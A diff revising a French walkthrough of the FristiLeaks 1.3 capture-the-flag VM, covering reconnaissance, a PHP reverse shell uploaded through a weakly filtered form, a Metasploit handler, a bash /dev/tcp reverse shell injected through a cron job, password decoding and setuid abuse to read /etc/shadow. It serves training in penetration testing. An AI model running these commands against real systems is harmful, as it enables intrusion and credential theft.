@@ -1,11 +1,8 @@
 # FristiLeaks: 1.3
 
-[FristiLeaks: 1.3](https://www.vulnhub.com/entry/fristileaks-13,133/) est une machine virtuelle vulnérable conçue par 
-[le chercheur en sécurité Ar0xA](https://twitter.com/@Ar0xA). L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ !
+[FristiLeaks: 1.3](https://www.vulnhub.com/entry/fristileaks-13,133/) est une machine virtuelle vulnérable, conçue par le chercheur en sécurité [Ar0xA](https://twitter.com/@Ar0xA) et publiée sur VulnHub au mois de décembre 2015. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
 
-Attention, spoilers...
-
-## Keep Calm and Drink Fristi
+## Recherche d'informations
 
 L'adresse IP de la VM FristiLeaks nous est gracieusement fournie à l'écran d'ouverture de session : 192.168.56.102.
 
@@ -19,8 +16,7 @@ IP adddress: 192.168.56.102
 localhost login: _
 ```
 
-Un scan nmap va nous permettre à la fois d'identifier les services installés 
-sur le serveur, et d'obtenir des informations sur le système d'exploitation.
+Un scan [__nmap__](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation.
 
 ```console
 root@blinils:~# nmap -sT -sV -A 192.168.56.102
@@ -55,8 +51,8 @@ _Nota Bene : le saviez-vous ? _Keep Calm and Carry On_ (en français, « restez 
 Source : Article [_Keep Calm and Carry On_](https://fr.wikipedia.org/wiki/Keep_Calm_and_Carry_On) de [Wikipédia en français](https://fr.wikipedia.org/)
 ([auteurs](https://fr.wikipedia.org/w/index.php?title=Keep_Calm_and_Carry_On&action=history)). Quant au terme [Fristi](https://nl.wikipedia.org/wiki/Fristi), il s'agit d'une marque de boisson lactée produite aux Pays-Bas._
 
-L'outil nmap a détecté la présence du fichier [robots.txt](http://www.commentcamarche.com/contents/1268-robots-txt), contenant trois entrées :
-/beer /cola et /sisi. Malheureusement, toutes renvoient [la même image](images/3037440.jpg) : un meme d'Obi-Wan Kenobi nous incitant à chercher ailleurs.
+L'outil __nmap__ a détecté la présence du fichier [```robots.txt```](http://www.commentcamarche.com/contents/1268-robots-txt), contenant trois entrées :
+```/beer```, ```/cola``` et ```/sisi```. Malheureusement, toutes renvoient [la même image](images/3037440.jpg) : un meme d'Obi-Wan Kenobi nous incitant à chercher ailleurs.
 
 ```console
 root@blinils:~# curl http://192.168.56.102/robots.txt
@@ -73,9 +69,9 @@ root@blinils:~# curl http://192.168.56.102/beer/
 <img src="/images/3037440.jpg"/>
 ```
 
-Peut-être la page /fristi/ ? Bingo.
+Peut-être la page ```/fristi/``` ? Bingo.
 
-## FristiLeaks Admin Portal
+## _Hidden in plain sight_
 
 ![Affichage de l'image ADMIN-fristi.png](images/ADMIN-fristi.png)
 
@@ -124,9 +120,9 @@ U5ErkJggg==
 ```
 
 Le message laissé par eezeepz est on ne peut plus clair : il s'agissait au départ d'un environnement de tests, mais qui n'a pas été modifié/nettoyé lors du passage en production. On y trouve ainsi deux images encodées en base64, dont une qui n'est pas affichée car placée en commentaires. La première représente 
-[Nelson Muntz](https://fr.wikipedia.org/wiki/Nelson_Muntz), un personnage de la série télévisée Les Simpson. La seconde, cachée, est une chaîne de caractères : keKkeKKeKKeKkEkkEk. Les _credentials_ ainsi récupérés (eezeepz/keKkeKKeKKeKkEkkEk) permettent de passer au niveau suivant.
+[Nelson Muntz](https://fr.wikipedia.org/wiki/Nelson_Muntz), un personnage de la série télévisée Les Simpson. La seconde, cachée, est une chaîne de caractères : ```keKkeKKeKKeKkEkkEk```. Les _credentials_ ```eezeepz:keKkeKKeKKeKkEkkEk``` permettent de passer au niveau suivant.
 
-## Formulaire d'upload et reverse shell
+## Exploitation du formulaire d'upload et mise en place d'un reverse shell
 
 ![Affichage de l'image UPLOAD-fristi.png](images/UPLOAD-fristi.png)
 
@@ -155,10 +151,7 @@ root@blinils:~# curl http://192.168.56.102/fristi/upload.php
 </html>
 ```
 
-Le portail d'administration de FristiLeaks n'est consisté que d'un simple formulaire d'upload de fichiers images. Or cette fonctionnalité n'est
-pas filtrée, car après plusieurs tests, on constate que seule l'extension du fichier est vérifiée. Il est ainsi possible de transférer
-[un script malveillant](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) afin d'interagir avec le serveur, d'y exécuter des
-commandes arbitraires et d'en prendre le contrôle.
+Le portail d'administration de FristiLeaks n'est consisté que d'un simple formulaire d'upload de fichiers images. Or cette fonctionnalité n'est pas filtrée, car après plusieurs tests, on constate que seule l'extension du fichier est vérifiée. Il est ainsi possible de transférer [un script malveillant](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) afin d'interagir avec le serveur, d'y exécuter des commandes arbitraires et d'en prendre le contrôle.
 
 Le principe est le suivant : un [_reverse shell_](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/) en PHP va être créé et déposé sur le serveur. Ce bout de code va, dans un premier temps, créer une connexion sur le port 12345 entre le serveur FristiLeaks (192.168.56.102) et notre propre machine (192.168.56.101), avant d'envoyer un [meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) à travers la connexion créée, qui sera exécuté sur le serveur distant.
 
@@ -179,7 +172,7 @@ Un listener est alors mis en place sur notre machine, afin d'écouter toute conn
 root@blinils:~# service postgresql start
 root@blinils:~# msfdb start
 root@blinils:~# msfconsole
-                                                  
+
 --snip--
 msf > use exploit/multi/handler
 msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
@@ -195,10 +188,11 @@ msf exploit(multi/handler) > exploit -j
 [*] Started reverse TCP handler on 192.168.56.101:12345
 ```
 
-Le fait d'appeler le fichier situé dans le répertoire /uploads amorce la connexion.
+Le fait d'appeler le fichier situé dans le répertoire ```/uploads``` amorce la connexion.
 
 ```console
-msf exploit(multi/handler) > [*] Sending stage (37543 bytes) to 192.168.56.102
+msf exploit(multi/handler) >
+[*] Sending stage (37543 bytes) to 192.168.56.102
 [*] Meterpreter session 1 opened (192.168.56.101:12345 -> 192.168.56.102:48731) at 2018-01-02 03:04:05 +0100
 
 msf exploit(multi/handler) > sessions
@@ -232,8 +226,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 bash-4.1$ 
 ```
 
-Partons à la recherche de fichiers intéressants... 
-le fichier checklogin.php contient par exemple un mot de passe pour se connecter à la base de données MySQL.
+Partons à la recherche de fichiers intéressants... le fichier ```checklogin.php``` contient par exemple un mot de passe pour se connecter à la base de données MySQL.
 
 ```console
 bash-4.1$ pwd
@@ -246,22 +239,7 @@ root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
 daemon:x:2:2:daemon:/sbin:/sbin/nologin
 adm:x:3:4:adm:/var/adm:/sbin/nologin
-lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
-sync:x:5:0:sync:/sbin:/bin/sync
-shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-halt:x:7:0:halt:/sbin:/sbin/halt
-mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
-uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
-operator:x:11:0:operator:/root:/sbin/nologin
-games:x:12:100:games:/usr/games:/sbin/nologin
-gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
-ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
-nobody:x:99:99:Nobody:/:/sbin/nologin
-vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
-saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
-postfix:x:89:89::/var/spool/postfix:/sbin/nologin
-sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
-apache:x:48:48:Apache:/var/www:/sbin/nologin
+--snip--
 mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
 vboxadd:x:498:1::/var/run/vboxadd:/bin/false
 eezeepz:x:500:500::/home/eezeepz:/bin/bash
@@ -337,7 +315,7 @@ listening on [any] 23456 ...
 --waiting but nothing--
 ```
 
-L'une des solutions consiste à rendre accessible le contenu du répertoire /home/admin grâce à chmod.
+L'une des solutions consiste à rendre accessible le contenu du répertoire ```/home/admin``` grâce à chmod.
 
 ```console
 bash-4.1$ echo "/home/admin/chmod -R 777 /home/admin" > /tmp/runthis
@@ -377,7 +355,7 @@ drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
 -rw-r--r--  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
 ```
 
-Le fichier cronjob.py nous apporte quelques éclaircissements quant à l'échec de notre _reverse shell_.
+Le fichier ```cronjob.py``` nous apporte quelques éclaircissements quant à l'échec de notre _reverse shell_.
 
 ```console
 bash-4.1$ tail -n1 cronjob.py
@@ -385,7 +363,7 @@ tail -n1 cronjob.py
             writefile("command did not start with /home/admin or /usr/bin")
 ```
 
-La commande placée dans le fichier /tmp/runthis doit démarrer avec soit /home/admin, soit /usr/bin. Soit.
+La commande placée dans le fichier ```/tmp/runthis``` doit démarrer avec soit ```/home/admin``` soit ```/usr/bin```. Soit.
 
 ```console
 bash-4.1$ echo "/usr/bin/../../bin/bash -i >& /dev/tcp/192.168.56.101/11111 0>&1" > /tmp/runthis
@@ -432,7 +410,7 @@ drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
 
 ## Élévation de privilèges (fristigod)
 
-Deux fichiers sont particulièrement intéressants : cryptedpass.txt (admin) et whoisyourgodnow.txt (fristigod).
+Deux fichiers sont particulièrement intéressants : ```cryptedpass.txt``` (admin) et ```whoisyourgodnow.txt``` (fristigod).
 
 ```console
 [admin@localhost ~]$ cat cryptedpass.txt && cat whoisyourgodnow.txt
@@ -441,7 +419,7 @@ mVGZ3O3omkJLmy2pcuTq
 =RFn0AKnlMHMPIzpyuTI0ITG
 ```
 
-Il doit s'agir de deux mots de passe probablement encodés à l'aide du script Python cryptpass.py, qui ressemble à ceci.
+Il doit s'agir de deux mots de passe probablement encodés à l'aide du script Python ```cryptpass.py``` qui ressemble à ceci.
 
 ```console
 [admin@localhost ~]$ cat cryptpass.py
@@ -480,7 +458,7 @@ root@blinils:~# python
 'thisisalsopw123'
 ```
 
-Nous voici donc en possession de deux nouveaux _credentials_ : admin/thisisalsopw123 et fristigod/LetThereBeFristi.
+Nous voici donc en possession de deux nouveaux _credentials_ : ```admin:thisisalsopw123``` et ```fristigod:LetThereBeFristi```.
 
 ```console
 bash-4.1$ id
@@ -502,7 +480,7 @@ uid=502(fristigod) gid=502(fristigod) groups=502(fristigod)
 
 ## Élévation de privilèges (root)
 
-Partons à la recherche de fichiers intéressants... le répertoire _.secret_admin_stuff_ semble être une bonne piste.
+Partons à la recherche de fichiers intéressants... le répertoire ```.secret_admin_stuff``` semble être une bonne piste.
 
 ```console
 -bash-4.1$ ls -al
@@ -532,7 +510,7 @@ dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
 _Nota Bene : quand un fichier exécutable est propriété de l'utilisateur root, et est rendu setuid, tout processus exécutant ce fichier peut effectuer ses tâches avec les permissions associées à root, ce qui constitue un risque de sécurité pour la machine, s'il existe une faille dans ce programme. En effet, un hacker pourrait utiliser cette faille pour effectuer des opérations réservées à root, par exemple en se créant un compte d'accès illimité en temps et en pouvoirs. Source : Article [Setuid](https://fr.wikipedia.org/wiki/Setuid) de
 [Wikipédia en français](https://fr.wikipedia.org/) ([auteurs](https://fr.wikipedia.org/w/index.php?title=Setuid&action=history))._
 
-L'historique des commandes Unix de l'utilisateur fristigod pourra sans doute nous aiguiller quant à l'utilisation de doCom.
+L'historique des commandes Unix de l'utilisateur ```fristigod``` pourra sans doute nous aiguiller quant à l'utilisation de ```doCom```.
 
 ```console
 -bash-4.1$ cat .bash_history
@@ -548,17 +526,10 @@ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
 exit
 sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
 sudo /var/fristigod/.secret_admin_stuff/doCom
-exit
-sudo /var/fristigod/.secret_admin_stuff/doCom
-sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-exit
-sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
-exit
-sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
 --snip--
 ```
 
-Il est ainsi possible d'effectuer des opérations réservées à root, telles que la lecture du fichier /etc/shadow.
+Il est ainsi possible d'effectuer des opérations réservées à root, telles que la lecture du fichier ```/etc/shadow```.
 
 ```console
 -bash-4.1$ sudo -u fristi ./doCom "head -n1 /etc/shadow"
@@ -600,17 +571,7 @@ Flag: Y0u_kn0w_y0u_l0ve_fr1st1
 mysql -u eezeepz -p
 Enter password: 4ll3maal12#
 
-Welcome to the MySQL monitor.  Commands end with ; or \g.
-Your MySQL connection id is 1554
-Server version: 5.1.73 Source distribution
-
-Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.
-
-Oracle is a registered trademark of Oracle Corporation and/or its
-affiliates. Other names may be trademarks of their respective
-owners.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+--snip--
 
 mysql> show databases;
 show databases;
